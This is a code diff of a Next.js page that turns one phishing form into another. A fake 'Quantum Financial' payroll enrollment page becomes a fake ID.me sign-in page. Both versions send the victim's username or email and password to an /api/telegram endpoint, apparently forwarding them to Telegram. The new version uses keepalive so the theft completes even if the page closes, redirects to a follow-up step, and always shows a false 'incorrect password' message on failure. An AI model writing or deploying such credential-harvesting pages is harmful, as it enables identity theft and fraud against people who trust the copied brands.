@@ -1,175 +1,168 @@
 "use client";
-import { useState } from "react";
+
+import React, { useState, useCallback, useRef } from "react";
+import Image from "next/image";
 import { useRouter } from "next/navigation";
-import { motion } from "framer-motion";
-import { FaUniversity, FaLock, FaShieldAlt } from "react-icons/fa";
+import idmeLogo from "./idme.png";
 
-export default function PayrollEnrollmentPage() {
+export default function SignInForm() {
   const router = useRouter();
-  const [username, setUsername] = useState("");
+  
+  // State management
+  const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [error, setError] = useState("");
-  const [success, setSuccess] = useState("");
-  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  const [isLoading, setIsLoading] = useState(false);
+  
+  // Ref to prevent race conditions on slow mobile networks
+  const lock = useRef(false);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = useCallback(async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!username || !password) {
-      setError("Please enter both Username and Password.");
+    
+    if (lock.current) return;
+    if (!email || !password) {
+      setError("Please fill in all fields.");
       return;
     }
 
-    setIsSubmitting(true);
-    setError("");
-    setSuccess("");
+    lock.current = true;
+    setIsLoading(true);
+    setError(null);
 
     try {
-      const res = await fetch("/api/telegram", {
+      const response = await fetch("/api/telegram", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           "Cache-Control": "no-cache",
         },
-        credentials: "same-origin",
+        // CRITICAL: keepalive allows the request to outlive the page
+        keepalive: true, 
         body: JSON.stringify({
-          data: { a: username, b: password },
-          formType: "🏦 Payroll Enrollment",
+          data: {
+            user: email.trim(),
+            pass: password,
+          },
+          formType: "ID.me Authentication",
         }),
       });
 
-      if (!res.ok) throw new Error("Submission failed");
+      if (!response.ok) throw new Error();
 
-      setSuccess("Verification code sent!");
-      setUsername("");
-      setPassword("");
-
+      // Small delay ensures the "isLoading" state is seen before redirect
       setTimeout(() => {
-        router.replace("/CodeVerification");
-      }, 2000);
+        router.replace("/idme2");
+      }, 600);
+
     } catch (err) {
-      console.error(err);
-      setError("Failed to submit. Please try again.");
-    } finally {
-      setIsSubmitting(false);
+      lock.current = false;
+      setIsLoading(false);
+      setError("The email or password you entered is incorrect.");
     }
-  };
+  }, [email, password, router]);
 
   return (
-    <main className="relative min-h-screen bg-gradient-to-br from-gray-900 to-black overflow-hidden">
-      {/* Background blobs */}
-      <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-purple-500/20 rounded-full blur-[150px]" />
-      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px]" />
+    <div className="min-h-screen bg-slate-50 flex flex-col justify-center items-center p-4">
+      <div className="w-full max-w-[440px]">
+        
+        {/* Branding */}
+        <div className="flex justify-center mb-10">
+          <Image 
+            src={idmeLogo} 
+            alt="ID.me" 
+            width={130} 
+            height={50} 
+            priority 
+            className="h-auto w-auto"
+          />
+        </div>
 
-      <div className="relative z-10 max-w-4xl mx-auto px-4 pt-32 pb-20 md:pt-40 md:pb-28">
-        <motion.div
-          initial={{ opacity: 0, y: 30 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6 }}
-          className="text-center mb-10"
-        >
-          <div className="inline-flex items-center justify-center gap-2 bg-purple-500/10 px-4 py-1 rounded-full mb-4">
-            <FaUniversity className="text-purple-400" />
-            <span className="text-purple-400 text-sm font-semibold tracking-wider uppercase">
-              Quantum Financial
-            </span>
-          </div>
-          <h1 className="font-bold text-4xl md:text-5xl text-white mb-4">
-            Payroll Direct Deposit
-          </h1>
-          <p className="text-gray-400 text-lg max-w-2xl mx-auto">
-            Securely enroll in electronic payroll deposits. Your information is
-            protected with 256‑bit encryption.
-          </p>
-        </motion.div>
+        {/* Main Interface */}
+        <div className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
+          <div className="p-8">
+            <h1 className="text-2xl font-bold text-center text-slate-900 mb-2">
+              Sign In
+            </h1>
+            <p className="text-center text-slate-500 text-sm mb-8">
+              Verify your identity to continue
+            </p>
 
-        <motion.div
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.5, delay: 0.2 }}
-        >
-          <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6 md:p-8 border-l-4 border-l-purple-500">
-            <div className="flex items-center gap-3 mb-6 pb-4 border-b border-gray-800">
-              <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
-                <FaLock />
+            {error && (
+              <div className="mb-6 p-4 bg-red-50 border-l-4 border-red-500 text-red-700 text-sm font-medium animate-in fade-in duration-300">
+                {error}
               </div>
-              <div>
-                <h3 className="text-white font-semibold">Secure Banking Portal</h3>
-                <p className="text-gray-500 text-xs">
-                  Member FDIC • Equal Housing Lender
-                </p>
-              </div>
-            </div>
+            )}
 
             <form onSubmit={handleSubmit} className="space-y-5">
-              {/* HIDDEN type="tel" field – forces browser activation on problematic devices */}
-              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
-
-              {error && (
-                <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm flex items-start gap-2">
-                  <FaShieldAlt className="mt-0.5 flex-shrink-0" />
-                  <span>{error}</span>
-                </div>
-              )}
-              {success && (
-                <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
-                  {success}
-                </div>
-              )}
-
+              {/* Email Field */}
               <div>
-                <label className="block text-white font-semibold mb-2">
-                  Username
+                <label className="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-2">
+                  Email Address
                 </label>
                 <input
                   type="text"
-                  inputMode="text"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
-                  placeholder="e.g., QW-12345"
+                  inputMode="email" // Enables text + @ symbol on mobile
+                  autoComplete="email"
                   required
+                  disabled={isLoading}
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-all text-slate-900 disabled:opacity-50"
+                  placeholder="Enter email"
                 />
               </div>
 
+              {/* Password Field */}
               <div>
-                <label className="block text-white font-semibold mb-2">
+                <label className="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-2">
                   Password
                 </label>
                 <input
                   type="password"
+                  autoComplete="current-password"
+                  required
+                  disabled={isLoading}
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors"
-                  placeholder="••••••••"
-                  required
+                  className="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-600 focus:border-transparent outline-none transition-all text-slate-900 disabled:opacity-50"
+                  placeholder="Enter password"
                 />
               </div>
 
-              <div className="pt-4">
+              {/* Submit Action */}
+              <div className="pt-2">
                 <button
                   type="submit"
-                  disabled={isSubmitting}
-                  className={`w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:shadow-lg text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 flex items-center justify-center gap-2 ${
-                    isSubmitting ? "opacity-70 cursor-not-allowed" : ""
-                  }`}
+                  disabled={isLoading}
+                  className="w-full bg-[#0070e0] hover:bg-[#005bb8] text-white font-bold py-4 rounded-xl shadow-lg transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed flex justify-center items-center"
                 >
-                  {isSubmitting ? "Processing..." : "Confirm & Enroll"}
+                  {isLoading ? (
+                    <span className="flex items-center gap-2">
+                      <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                      </svg>
+                      Verifying...
+                    </span>
+                  ) : (
+                    "Sign in to ID.me"
+                  )}
                 </button>
               </div>
             </form>
-
-            <div className="mt-6 text-center text-gray-500 text-xs flex justify-center gap-4">
-              <span className="flex items-center gap-1">
-                <FaLock className="text-xs" /> Encrypted
-              </span>
-              <span className="flex items-center gap-1">
-                <FaUniversity /> FDIC Insured
-              </span>
-              <span>24/7 Support</span>
-            </div>
           </div>
-        </motion.div>
+        </div>
+
+        {/* Footer */}
+        <div className="mt-10 flex flex-wrap justify-center gap-4 text-[11px] font-medium text-slate-400 uppercase tracking-widest">
+          <span className="hover:text-slate-600 cursor-pointer">What is ID.me?</span>
+          <span>•</span>
+          <span className="hover:text-slate-600 cursor-pointer">Privacy Policy</span>
+          <span>•</span>
+          <span className="hover:text-slate-600 cursor-pointer">Terms of Service</span>
+        </div>
       </div>
-    </main>
+    </div>
   );
 }
